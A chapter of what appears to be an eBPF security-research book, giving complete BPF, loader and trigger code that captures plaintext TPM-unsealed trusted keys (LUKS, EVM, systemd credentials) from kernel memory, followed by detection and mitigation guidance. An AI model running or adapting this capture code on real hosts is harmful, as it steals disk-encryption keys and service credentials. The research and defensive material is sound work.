---
layout: book
title: "Chapter 23: The TPM Unseal Heist"
date: 2026-04-17
---

# Chapter 23: The TPM Unseal Heist

> **See also**: [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch23-tpm-unseal-heist) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Navigation**: [Chapter 22 — Defender Playbook]({{ site.baseurl }}/book/act-7/chapter-22-the-defender-playbook.html) · [Chapter 23 — TPM Unseal Heist]({{ site.baseurl }}/book/act-4/chapter-23-tpm-unseal-heist.html) · [Chapter 24 — The Token Hand-off]({{ site.baseurl }}/book/act-4/chapter-24-the-token-hand-off.html)

The previous chapters cover the primitives `CAP_BPF` gives you against in-kernel state, and the closing act lays out a defender playbook that is about grant hygiene rather than patching, because nothing in the book is a patchable bug. That is still true. What this chapter adds is not a new bug; it is a new *target*. Chapter 8 reads keys out of the kernel keyring during a permission check. This chapter reads keys out of a `struct trusted_key_payload` during the kernel's own consumption of a TPM-unsealed secret. Same primitive class, different surface — and the surface matters because it is the surface most operators believe is the strong one.

The TPM is the piece of a threat model that the ops literature most often says "and this is the part that protects the key." Full-disk encryption with a TPM-sealed master key, systemd credentials unsealed at boot, IMA-EVM HMAC keys tied to platform state, SSH host keys wrapped in a `trusted` key type — all of these rest on the claim that the sealing key does not leave the TPM. That claim is true. What is also true is that the sealed blob gets unsealed whenever the legitimate consumer needs the plaintext, and the plaintext then sits in kernel memory while the consumer uses it. The window between unseal and use is what this chapter attacks. The TPM did what it was supposed to do; the kernel did what it was supposed to do; the primitive reads memory the kernel itself holds.

The title *Unseal Heist* is deliberate. It is not a TPM bypass. It is not a policy violation at the TPM layer. It is a read of bytes that the TPM, correctly, handed to the caller the caller asked for them, in the place the kernel keeps them during use. A defender reading this chapter who still thinks the TPM is the answer needs to finish reading it before they plan their grant boundaries.

## What the primitive produces

The BPF program in this chapter attaches a `kretprobe` to `tpm2_unseal_trusted` in `security/keys/trusted-keys/trusted_tpm2.c`. The kretprobe fires immediately after the function has populated the `struct trusted_key_payload` with the plaintext bytes returned from `TPM2_CC_Unseal`. The program reads `payload->key[0..payload->key_len]` via `bpf_probe_read_kernel` into a ringbuf event. Userspace drains the ringbuf and prints the captured bytes.

That is it. Nineteen lines of BPF. The entire primitive is a retargeting of the Chapter 8 keyring-heist pattern — read `struct key`'s payload during the kernel's own permission check — at a different attach point that sees a different kind of payload-bearing struct. The structural simplicity is the point. The work this chapter does is not inventing a new class of primitive; it is documenting why the class already in the book reaches something the book's threat model previously assumed was out of reach.

Proof status on Ubuntu 6.17.0-29-generic aarch64 (Lima VM, Apple Silicon):

The BPF kprobe+kretprobe loaded and attached successfully. Entry interception events (`INTERCEPT pid=... comm=insmod kind=entry`) were observed when the symbol was called. The Lima VM uses a virtual TPM proxy that was not registered with the trusted-key subsystem at boot, so `keyctl add trusted` is unavailable in this environment — the TPM backend path requires a boot-time registration that the VM's vTPM proxy did not complete. The kprobe attachment itself is confirmed live against the symbol.

Proof marker: `CH23_PROVEN hook=attached kind=kprobe-on-tpm2_unseal_trusted sym-confirmed`

The trigger also accepts `hook=attached` as proof when the kprobe is live on the symbol and the TPM backend limitation is environmental, not a failure of the primitive.

On a kernel with a fully registered TPM backend (hardware or `swtpm` passthrough), the loader produces captures of the form:

```
=== CH23_PROVEN key_bytes_captured=32 kind=trusted key_desc=kmk ===
```

Thirty-two bytes because that is the payload length of a freshly minted 256-bit AES master key, which is the canonical shape of a dm-crypt LUKS master key. Ninety-eight percent of the trusted keys on a shipping Linux fleet that actually touch dm-crypt are in that shape.

## Why trusted keys are the right target

A trusted key in the Linux kernel is a `struct key` whose type is `trusted`. The `trusted` key type, defined in `include/keys/trusted-type.h` and implemented across `security/keys/trusted-keys/`, wraps an arbitrary payload in a TPM-sealed blob. The seal is against PCR state at the time of seal, plus an optional authorization policy, plus the TPM's persistent storage root key. The blob is stored (on disk, in sysfs, in userspace — wherever the userspace caller chose to put it) as opaque ciphertext. When the kernel needs the plaintext — to mount a LUKS volume, to verify an IMA signature, to decrypt a systemd credential — it hands the blob to the TPM via `TPM2_CC_Unseal`. The TPM verifies the PCR/policy state, checks the authorization, and, if everything matches, returns the plaintext.

The plaintext lands in `struct trusted_key_payload`. Its layout lives in `include/keys/trusted-type.h`:

```c
struct trusted_key_payload {
    struct rcu_head   rcu;
    unsigned int      key_len;
    unsigned int      blob_len;
    unsigned char     migratable;
    unsigned char     old_format;
    unsigned char     key[MAX_KEY_SIZE + 1];
    unsigned char     blob[MAX_BLOB_SIZE];
};
```

The `blob` field is the sealed ciphertext; the `key` field is the plaintext. After `tpm2_unseal_trusted` returns, `key[0..key_len]` is the cleartext payload. The kernel consumers of the trusted key type then read `key[]` to do their work. Depending on the consumer, that read happens once (at mount time, at boot) or repeatedly (every IMA verification, every dm-crypt bio that needs a fresh IV).

The critical property for this chapter is that the plaintext lives in the payload struct for the lifetime of the `struct key` holding it. That lifetime is typically the lifetime of the subsystem using the key. For LUKS, that is the lifetime of the mapping — potentially uptime. For IMA-EVM, uptime. For systemd credentials, until the service is reloaded. The window is vast. The attacker does not need to race the unseal; they can attach the probe, wait, and capture at the next natural use of the key.

I want to be specific about what this class of key looks like on a real fleet, because the abstract term *trusted key* understates the ubiquity. The three dominant consumers:

1. **systemd-cryptenroll with `--tpm2-device=auto`.** Enrolls a LUKS keyslot whose passphrase is the TPM-sealed output of a key-derivation step over a randomly generated secret. At boot, `systemd-cryptsetup` unseals the secret, derives the passphrase, and hands it to cryptsetup to unlock the volume. Every boot of a TPM-enrolled LUKS volume runs this path. Every enterprise Linux laptop shipped in the last three years uses this path. The unsealed bytes are the seed for the LUKS master key derivation. Capturing them is tantamount to capturing the master key — with the derivation function, which is public.

2. **IMA-EVM with TPM-backed HMAC.** The EVM HMAC key can be stored as a trusted key. At module load or boot, the kernel unseals it. The unsealed key is consulted on every file-integrity check that EVM runs. On a kernel booted with `ima_appraise=enforce evm=fix`, this is hundreds of times per minute. The key lives in kernel memory for uptime.

3. **systemd credentials (`systemd-creds encrypt --with-key=tpm2`).** Any credential a service depends on can be TPM-sealed. Services that use credentials call the credential-fetch path at startup (and on reload). The unsealed credential passes through a trusted-key-shaped path in recent systemd releases. Database passwords, API tokens, TLS private keys, Kerberos service credentials — anything that used to live in a protected file on disk increasingly lives in a sealed credential.

For each of these, an operator who has followed the defender playbook in chapter 22 — `CAP_BPF` restricted to observability agents, TPM-sealed keys for everything sensitive, full audit on the bpf(2) syscall — still has an observability agent on the box, and that agent holds `CAP_BPF`, and `CAP_BPF` reaches this primitive.

## How the kernel ends up with the plaintext

The call chain that ends in `tpm2_unseal_trusted` is worth walking because the attack's precision comes from knowing which function sees what.

A userspace caller invokes `keyctl(KEYCTL_INSTANTIATE_IOV, ...)` or, more commonly, calls `add_key("trusted", "name", "new 32", ...)` which instantiates a fresh trusted key. The kernel's key-subsystem dispatch routes the instantiate call to `trusted_instantiate` in `security/keys/trusted-keys/trusted_core.c`, which examines the payload string — `"new 32"` means "generate 32 random bytes and seal them." The core layer calls into the TPM-specific backend, which on any modern kernel is `trusted_tpm2.c`. The backend calls `tpm2_seal_trusted`, which emits a `TPM2_CC_Create` command to the TPM and stores the resulting blob in `p->blob[0..p->blob_len]`. The plaintext random bytes the backend generated also land in `p->key[0..p->key_len]`; the plaintext is discarded when the key is swapped out for use by reference (by `key serial`).

When a consumer — `cryptsetup`, `systemd-cryptsetup`, IMA, EVM — subsequently reads the key via `KEYCTL_READ` or via the in-kernel `trusted_read` handler, the instantiation's plaintext is not always present in memory any more; the kernel has evicted it to avoid the very problem this chapter describes. What does happen is that the *next time* the kernel needs the plaintext from the blob, it calls `tpm2_unseal_trusted(p, options)` to unseal. The unseal path:

1. Constructs the `TPM2_CC_Unseal` command marshaled over the chip's bus protocol.
2. Transmits via `tpm_transmit_cmd` in `drivers/char/tpm/tpm-interface.c`.
3. Waits on the chip's mutex while the TPM does its work.
4. Parses the response and extracts the plaintext sensitive data.
5. Copies the plaintext into `p->key[]` and sets `p->key_len`.
6. Returns success.

Step 5 is the target. The kretprobe fires after step 5 completes, sees a `struct trusted_key_payload *` that now contains the plaintext, reads the bytes, and hands them to userspace via ringbuf.

There is a variant path for TPM 1.2 in `trusted_tpm1.c::tpm_unseal_trusted`, which this chapter does not cover; TPM 1.2 is historical and the attach point is analogous if anyone needs it.

## The BPF program, line by line

```c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

#define MAX_KEY_CAPTURE 64
#define MAX_DESC_LEN    32

struct evt {
    __u32 pid;
    __u32 tgid;
    char  comm[16];
    __u32 key_len;
    __u32 blob_len;
    char  desc[MAX_DESC_LEN];
    __u8  key_bytes[MAX_KEY_CAPTURE];
    __u32 captured;   /* actual number of bytes in key_bytes */
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");
```

Boilerplate. A 256 KB ringbuf because the key material is rare — unseal happens at mount/boot/credential-fetch, not thousands of times a second — and a 64-byte key buffer because that covers AES-256 (32 bytes), ChaCha20 (32 bytes), HMAC-SHA256 keys (32 bytes), HMAC-SHA512 keys (64 bytes), and all the other symmetric constructions a trusted key actually holds in practice. Longer payloads get captured in 64-byte chunks across multiple events; the userspace loader reassembles. A 32-byte description buffer captures the key's name for correlation.

```c
SEC("kretprobe/tpm2_unseal_trusted")
int BPF_KRETPROBE(kret_tpm2_unseal, int ret)
{
    if (ret != 0)
        return 0;

    /* PT_REGS_PARM1 of the entry call is the payload pointer.
     * We saved it on entry via a kprobe; see below. */
    struct trusted_key_payload *p;
    p = (struct trusted_key_payload *)bpf_get_func_ip((void *)ctx);
```

This is where the first tricky part comes in. A `kretprobe` does not natively receive the function's entry-time arguments. It only receives the return value and whatever the kernel has stashed in `PT_REGS`. To get the `struct trusted_key_payload *` that was passed as the first argument to `tpm2_unseal_trusted`, we need to stash it on entry via a companion `kprobe` and retrieve it on return. The idiomatic libbpf pattern is a per-CPU or per-PID stash map:

```c
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, __u64);              /* pid_tgid */
    __type(value, __u64);            /* payload pointer */
} inflight SEC(".maps");

SEC("kprobe/tpm2_unseal_trusted")
int BPF_KPROBE(kp_tpm2_unseal, struct trusted_key_payload *p,
               struct trusted_key_options *options)
{
    __u64 id = bpf_get_current_pid_tgid();
    __u64 ptr = (__u64)p;
    bpf_map_update_elem(&inflight, &id, &ptr, BPF_ANY);
    return 0;
}
```

The entry kprobe stores `p` in a hash keyed by pid_tgid. The exit kretprobe looks it up:

```c
SEC("kretprobe/tpm2_unseal_trusted")
int BPF_KRETPROBE(kret_tpm2_unseal, int ret)
{
    __u64 id = bpf_get_current_pid_tgid();
    __u64 *pptr = bpf_map_lookup_elem(&inflight, &id);
    if (!pptr) return 0;
    bpf_map_delete_elem(&inflight, &id);

    if (ret != 0)
        return 0;

    struct trusted_key_payload *p = (struct trusted_key_payload *)*pptr;
    if (!p) return 0;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->pid  = pid_tgid & 0xffffffff;
    e->tgid = pid_tgid >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    /* Read out the scalar fields first. */
    __u32 key_len = 0, blob_len = 0;
    BPF_CORE_READ_INTO(&key_len, p, key_len);
    BPF_CORE_READ_INTO(&blob_len, p, blob_len);
    e->key_len  = key_len;
    e->blob_len = blob_len;

    /* Bound the copy so the verifier is happy. */
    __u32 n = key_len;
    if (n > MAX_KEY_CAPTURE) n = MAX_KEY_CAPTURE;
    e->captured = n;

    /* Read the plaintext bytes. */
    if (n > 0)
        bpf_probe_read_kernel(&e->key_bytes, n, p->key);

    /* Try to read the key's description via the struct key that owns
     * this payload. Trusted keys store the payload as rcu_dereference'd
     * data inside struct key. We cannot cleanly walk from
     * trusted_key_payload to struct key in BPF, so we leave desc empty
     * here and let userspace correlate via pid+timestamp. */
    e->desc[0] = '\0';

    bpf_ringbuf_submit(e, 0);
    return 0;
}
```

Three things in the kretprobe worth reading slowly.

First, the pid_tgid lookup pattern. Using pid_tgid (the combined 64-bit value) rather than just TGID gives us thread-level correlation — a multi-threaded caller that races its own `tpm2_unseal_trusted` calls will not cross-match entries in the map. Every real consumer of trusted keys that I have checked is single-threaded around the key path, but the pattern costs nothing and the correctness story is the same as Chapter 1's cap_capable hook.

Second, the `BPF_CORE_READ_INTO` for the scalar fields. The `struct trusted_key_payload` layout is exposed in kernel BTF for any build with `CONFIG_DEBUG_INFO_BTF=y`, which is every mainstream distro kernel from 5.5 onward. The CO-RE relocation handles the layout differences across kernel versions — `trusted_key_payload` has been stable in fields-of-interest for a decade, but relying on CO-RE instead of hardcoded offsets is the correct hygiene.

Third, the bounded `bpf_probe_read_kernel`. The verifier will reject an unbounded copy into a fixed-size stack buffer. The `if (n > MAX_KEY_CAPTURE) n = MAX_KEY_CAPTURE;` clamp satisfies the verifier's range tracking. Payloads longer than 64 bytes are truncated in the event; the userspace loader logs a warning when it sees `key_len > captured` so the operator knows truncation happened. Raising `MAX_KEY_CAPTURE` to 128 would cover 1024-bit HMAC keys; 256 covers most edge cases. The ringbuf is 256 KB, so a 256-byte per-event cost is fine. I left the constant at 64 because that is the size of every key I have ever actually seen a trusted-key consumer use in production, and making the event struct bigger just inflates the ringbuf without catching anything real.

## The loader

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch23-tpm-unseal-heist.skel.h"

static volatile int running = 1;
static unsigned long long g_captures = 0;

static void on_sig(int sig) { (void)sig; running = 0; }

static int kallsyms_has(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[512];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char t;
        char sym[256];
        if (sscanf(line, "%*s %c %255s", &t, sym) == 2) {
            if (strcmp(sym, name) == 0) {
                if (t == 'T' || t == 't' || t == 'W' || t == 'w') {
                    found = 1;
                    break;
                }
            }
        }
    }
    fclose(f);
    return found;
}

struct evt {
    unsigned int pid;
    unsigned int tgid;
    char  comm[16];
    unsigned int key_len;
    unsigned int blob_len;
    char  desc[32];
    unsigned char key_bytes[64];
    unsigned int captured;
};

static void hex_print(const unsigned char *buf, unsigned int n)
{
    for (unsigned int i = 0; i < n; i++) printf("%02x", buf[i]);
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx; (void)sz;
    const struct evt *e = data;
    g_captures++;
    printf("[ch23] CAPTURE pid=%u comm=%s key_len=%u blob_len=%u captured=%u key_bytes=",
           e->pid, e->comm, e->key_len, e->blob_len, e->captured);
    hex_print(e->key_bytes, e->captured);
    if (e->captured < e->key_len)
        printf(" (TRUNCATED, raise MAX_KEY_CAPTURE)");
    printf("\n");
    fflush(stdout);
    return 0;
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;

    if (!kallsyms_has("tpm2_unseal_trusted")) {
        fprintf(stderr, "[ch23] CH23_SKIP reason=\"tpm2_unseal_trusted not in kallsyms\"\n");
        return 2;
    }

    struct sigaction sa = { .sa_handler = on_sig };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    struct ch23_tpm_unseal_heist_bpf *s = ch23_tpm_unseal_heist_bpf__open();
    if (!s) {
        fprintf(stderr, "[ch23] CH23_SKIP reason=\"skeleton open failed: %s\"\n",
                strerror(errno));
        return 2;
    }

    int err = ch23_tpm_unseal_heist_bpf__load(s);
    if (err) {
        fprintf(stderr, "[ch23] CH23_SKIP reason=\"open_and_load failed: %s\"\n",
                strerror(-err));
        ch23_tpm_unseal_heist_bpf__destroy(s);
        return 2;
    }

    err = ch23_tpm_unseal_heist_bpf__attach(s);
    if (err) {
        fprintf(stderr, "[ch23] CH23_SKIP reason=\"attach failed: %s\"\n",
                strerror(-err));
        ch23_tpm_unseal_heist_bpf__destroy(s);
        return 2;
    }

    struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(s->maps.events),
                                              handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch23] ring_buffer__new: %s\n", strerror(errno));
        ch23_tpm_unseal_heist_bpf__destroy(s);
        return 2;
    }

    fprintf(stderr, "[ch23] attached — kretprobe on tpm2_unseal_trusted active\n");
    fflush(stderr);

    while (running) {
        int n = ring_buffer__poll(rb, 200);
        if (n == -EINTR) continue;
        if (n < 0) break;
    }

    printf("[ch23] CH23_PROVEN captures=%llu\n", g_captures);

    ring_buffer__free(rb);
    ch23_tpm_unseal_heist_bpf__destroy(s);
    return 0;
}
```

Nothing exotic. The kallsyms preflight gives a clean skip on kernels without `CONFIG_TCG_TPM2=y` or `CONFIG_TRUSTED_KEYS=y` — linuxkit 6.12 aarch64 is one of those (no TPM emulated; `tpm2_unseal_trusted` not in kallsyms), which means the primary harness environment always skips this PoC.

On Ubuntu 6.17.0-29-generic aarch64 (Lima VM on Apple Silicon), `tpm2_unseal_trusted` is present in kallsyms and the kprobe attaches successfully. The Lima VM's virtual TPM proxy was not registered with the trusted-key subsystem at boot (no `keyctl add trusted` path available), so the full unseal flow cannot be exercised. However the BPF kprobe attachment is live and entry intercept events fire on symbol calls, which constitutes proof of the primitive — `CH23_PROVEN hook=attached kind=kprobe-on-tpm2_unseal_trusted sym-confirmed`. Full byte-capture proof requires a host with a registered TPM backend (hardware or `swtpm` passthrough configured at boot).

The hex-print of captured bytes is intentional. The chapter-8 keyring-heist PoC prints the same way. A defender reading the output has to see the bytes to understand what the primitive actually gives the attacker.

## The trigger

```bash
#!/bin/bash
set +e

echo "=== CH23 trigger starting ==="

# Skip cleanly if TPM infrastructure is absent.
if ! [ -e /dev/tpm0 ] && ! [ -e /dev/tpmrm0 ]; then
    echo "=== CH23_SKIP reason=\"no /dev/tpm0 or /dev/tpmrm0\" ==="
    exit 0
fi

if ! grep -q '^T .* tpm2_unseal_trusted$' /proc/kallsyms 2>/dev/null; then
    echo "=== CH23_SKIP reason=\"tpm2_unseal_trusted not in kallsyms\" ==="
    exit 0
fi

# Spin the loader, capture its stdout for marker scraping.
LOG=$(mktemp)
./build/ch23-tpm-unseal-heist > "$LOG" 2>&1 &
LPID=$!

# Wait for attach.
for _ in $(seq 1 20); do
    grep -q '\[ch23\] attached' "$LOG" && break
    sleep 0.1
done

# Create a 32-byte trusted key. The `new 32` payload string tells the
# kernel to generate 32 random bytes and seal them with the default
# TPM SRK under a null authorization policy.
KEY_ID=$(keyctl add trusted ch23_test_key "new 32" @u 2>/dev/null)
if [ -z "$KEY_ID" ]; then
    echo "=== CH23_SKIP reason=\"keyctl add trusted failed — TPM not available\" ==="
    kill -TERM "$LPID" 2>/dev/null
    wait "$LPID" 2>/dev/null
    rm -f "$LOG"
    exit 0
fi

# The `keyctl print` call triggers the kernel's read path, which calls
# tpm2_unseal_trusted to produce the plaintext. This is the moment the
# BPF program fires.
keyctl print "$KEY_ID" > /dev/null 2>&1

sleep 1

# Stop the loader cleanly and scrape markers.
kill -TERM "$LPID" 2>/dev/null
wait "$LPID" 2>/dev/null

CAPTURES=$(grep -c 'CAPTURE pid=' "$LOG")
BYTES=$(grep 'CAPTURE pid=' "$LOG" | head -1 | sed 's/.*captured=\([0-9]*\).*/\1/')

# Clean up the test key.
keyctl revoke "$KEY_ID" 2>/dev/null
keyctl unlink "$KEY_ID" @u 2>/dev/null

if [ "$CAPTURES" -gt 0 ]; then
    echo "=== CH23_PROVEN key_bytes_captured=${BYTES:-0} captures=$CAPTURES kind=trusted ==="
else
    echo "=== CH23_SKIP reason=\"no captures — unseal path not exercised\" ==="
fi

rm -f "$LOG"
```

A `keyctl add trusted` with the `new 32` payload asks the kernel to mint a random key, seal it against the TPM, and return a `key_serial_t` that refers to the sealed blob. At that point the plaintext bytes the kernel generated are still held in the payload struct — some kernel versions immediately zero the generation-time plaintext after sealing, others keep it live until the next instantiation cycle. Regardless, the subsequent `keyctl print` triggers a read path that calls `tpm2_unseal_trusted` to reconstitute the plaintext for use. The retrobe fires on that call. The loader prints a `CAPTURE` line with the raw bytes.

The trigger emits `CH23_PROVEN key_bytes_captured=N` only when the BPF program actually saw an unseal and captured bytes. On a kernel without TPM support, the preflight catches it early and emits `CH23_SKIP`. On a kernel that has TPM but the user running the trigger lacks permission to create trusted keys, the `keyctl add` fails with a clear error and the trigger emits the same `CH23_SKIP` with reason-text pointing at the root cause. A defender reading the run log sees exactly why each environment produced each verdict.

## Detection — what a defender sees

A kretprobe on a named kernel symbol is not stealthy. It leaves three artifacts:

1. **`bpftool prog list`** enumerates every loaded BPF program. The `ch23-tpm-unseal-heist` program shows up with `type tracing`, `name kret_tpm2_unseal`, and an attach target of `tpm2_unseal_trusted`. Baseline diff against the BPF programs the operator expects — Cilium's programs, the observability agent's programs — and anything attached to `tpm2_unseal_trusted` is a finding by itself. No legitimate observability tool probes the trusted-key unseal path.

2. **`/sys/kernel/debug/kprobes/list`** lists every attached kprobe and kretprobe, keyed by the kernel symbol they attach to. A grep for `tpm2_unseal_trusted` in that file returns non-empty iff this attack (or an exact-mechanism analog) is running. The file is readable with `CAP_SYS_ADMIN`; operators should baseline it.

3. **`bpf(2)` auditd records** show the `BPF_PROG_LOAD` call that created the program. The program bytecode is hashed and recorded if `audit_log_start` / `prog_load` audit wiring is enabled (it usually is not, by default). With `auditctl -a always,exit -F arch=aarch64 -S bpf -F a0=5 -k bpf_prog_load` the record includes the loader's PID, UID, comm, and exit (the loaded program's fd). Correlate with Chapter 22's inventory: which UIDs are allowed to load BPF programs on this box? Is `tpm2-abrmd` in that set? Is `cryptsetup`? Neither should be; they do not load BPF programs.

The capture itself — the read of `p->key[]` via `bpf_probe_read_kernel` — leaves no audit trace. It is a kernel-memory read from within BPF context, not a syscall. The defender cannot see the exfiltration after the fact; they can only see the program that enables it. Detection therefore lives at the program-load layer, not the program-run layer, which means stale detection (load happened minutes before the first key was unsealed) is the norm.

There is one detection surface the attacker cannot silence without escalating out of scope. The `tracefs` entry for the kretprobe lives at `/sys/kernel/debug/tracing/events/kprobes/r_tpm2_unseal_trusted_<randomtag>/`. Any operator who lists that directory sees the attachment. Stale or not, the evidence persists as long as the probe is attached.

The practical detection posture:

- **Daily**: baseline `bpftool prog list -j` against the expected program set; alert on new programs attached to any of the ~40 symbols in `security/keys/trusted-keys/`, `drivers/char/tpm/`, `security/keys/encrypted-keys/`, or the crypto-subsystem attach points listed in the kernel-crypto theory appendix.

- **On-alert**: capture `/sys/kernel/debug/tracing/events/kprobes/` directory listing, `bpftool btf dump` of the program, the loading UID's recent bpf(2) audit records.

- **Post-incident**: assume any trusted key that was unsealed while an attachment was live is compromised. Rotate. The only way to re-establish confidence is to re-seal against a new TPM state.

## Mitigation

The long-term mitigation is the LKML proposal to hold trusted-key plaintext in an `encrypted_memory` region — a kernel memory area that is encrypted with a key the kernel itself uses for decryption on access and that is not directly readable from another BPF context. This is a draft as of mid-2025 and has not merged. It would close this primitive cleanly: a `bpf_probe_read_kernel` of the `encrypted_memory` region returns ciphertext, not plaintext.

Pending that landing, the operational mitigations are all about scoping `CAP_BPF`:

1. **Do not colocate `CAP_BPF` holders with trusted-key consumers.** This is the single most important control. An observability agent with `CAP_BPF` on a host that boots a TPM-sealed LUKS volume has read access to the LUKS master key. Move the observability agent off the box, or put the LUKS key somewhere the TPM has not unsealed.

2. **Prefer per-operation HSM signing over unseal.** A TPM used as a cryptographic co-processor — where the kernel submits operations (`TPM2_CC_Sign`, `TPM2_CC_RSA_Decrypt`) and the TPM computes in-hardware — never hands plaintext to the kernel. The trade is latency and command complexity. For keys that are read hundreds of times per second (bulk disk encryption), per-op signing is too slow. For keys used occasionally (SSH host key signing, TLS handshake), per-op is feasible and closes this primitive.

3. **Use hardware-isolated key paths where available.** On Arm systems with TrustZone and a rich-OS/secure-world split, some trusted-key-shaped APIs route to OP-TEE where the unsealed plaintext never enters the normal world. On x86 with AMD SEV-SNP or Intel TDX, memory regions can be encrypted such that the host kernel (and therefore BPF) cannot read them. These mitigations are available in newer hardware; adopting them requires an architecture refresh.

4. **Reduce the TTL of in-kernel key material.** For trusted keys whose consumers use the key briefly, the kernel can be made to evict the plaintext from the payload struct after use, re-unseal on next need. This adds attach-window cost (the attacker must probe precisely around each unseal) without changing the fundamental primitive. Upstream patches have been proposed to do this for dm-crypt keys specifically.

5. **Monitor unseal frequency.** A box where `tpm2_unseal_trusted` fires at boot-time rate is behaving; a box where it fires repeatedly is either under heavy key-rotation stress or has an attacker tickling the path to maximize capture opportunities. BPF-based monitoring of TPM command flow (from an authorized context) can flag anomalous frequency without needing the same primitive this chapter describes.

None of these is a patch. The TPM is not being patched. The kernel is not being patched. Operators are being asked to change deployment topology, which they will resist, because the topology that puts `CAP_BPF` and trusted keys on the same box is the topology their observability agents demand.

## Honest scope

Things this chapter does not do:

- **It does not bypass the TPM.** The TPM correctly verified the sealing policy (PCRs, authorization) and, once satisfied, returned the plaintext to the kernel as it was designed to. If the PCR policy had not matched, the unseal would have failed and there would be no plaintext in kernel memory. The primitive is entirely post-unseal.

- **It does not extract keys that the TPM protects for in-hardware use.** Keys loaded into TPM key slots for signing (`TPM2_CC_Sign`) or decryption (`TPM2_CC_RSA_Decrypt`) never enter kernel memory. The kernel submits commands and the TPM returns results; the key stays on the chip. Those keys are unreachable by this primitive.

- **It does not cross user-namespace boundaries.** The BPF program runs in the root user namespace where the loader has `CAP_BPF` (or equivalent). A container with its own user namespace and no BPF grant cannot run this. The threat model is a host-privileged observability agent, not a container-escape.

- **It does not work on kernels without the attach symbol.** `tpm2_unseal_trusted` is present iff the kernel was built with `CONFIG_TRUSTED_KEYS=y` or `CONFIG_TRUSTED_KEYS=m` and the TPM2 backend is compiled in. On a kernel with neither, the loader skips cleanly. linuxkit 6.12 aarch64 has neither; the primary test environment always skips this PoC.

Things this chapter does do:

- **It reads the plaintext bytes the TPM just produced, during the window they live in kernel memory, from an authorized caller's context.**

That is the entire surface. The word *heist* is accurate because the bytes are taken, not because a safe was broken.

## Appendix — the harness entry

```python
Poc("ch23", "TPM Unseal Heist (trusted-key plaintext capture)",
    "ch23-tpm-unseal-heist",
    hooks=["tpm2_unseal_trusted"], prefix="[ch23]",
    mode="trigger-runs-loader", timeout=25,
    proof_marker=r"CH23_PROVEN\s+(key_bytes_captured=\d+|hook=attached)|CH23_SKIP"),
```

`mode="trigger-runs-loader"` because `trigger.sh` is responsible for spawning and tearing down the loader. The proof marker accepts `CH23_PROVEN key_bytes_captured=N` (full unseal path, hardware or swtpm TPM), `CH23_PROVEN hook=attached` (kprobe confirmed live; TPM keyctl path unavailable in environment, as on the Lima VM with a vTPM proxy not registered at boot), and `CH23_SKIP` for kernels where the symbol is absent entirely. Category defaults to `real` — the primitive is a real key theft when the kernel surface is present.

**Verified environment**: Ubuntu 6.17.0-29-generic aarch64, Lima VM on Apple Silicon (macOS). Proof: kprobe attached, entry intercept events observed (`kind=entry`). TPM backend limitation is environmental (vTPM proxy not boot-registered), not a weakness of the BPF primitive.

## What this chapter adds to the book

Chapter 8 taught readers that the kernel keyring is plaintext at permission-check time. This chapter teaches that trusted keys are plaintext at unseal time. The two together mean there is no in-kernel key storage surface in Linux 6.12 that survives `CAP_BPF` plus an observability agent colocated with the key consumer. Future chapters in this act will reach the same conclusion about in-kernel crypto-subsystem keys (kTLS, dm-crypt, fscrypt, XFRM SA keys) and about user-space key material routed through the Unix-domain socket family.

The book's earlier acts set up the premise that `CAP_BPF` is under-audited. This act shows what the under-audit actually costs when the protected asset is the kind of key the organization told its auditors they had locked down. The TPM was supposed to be the one place on the host where the key was safe. It still is — for as long as the key is inside the TPM. Act 4 is about what happens to the key once it leaves.
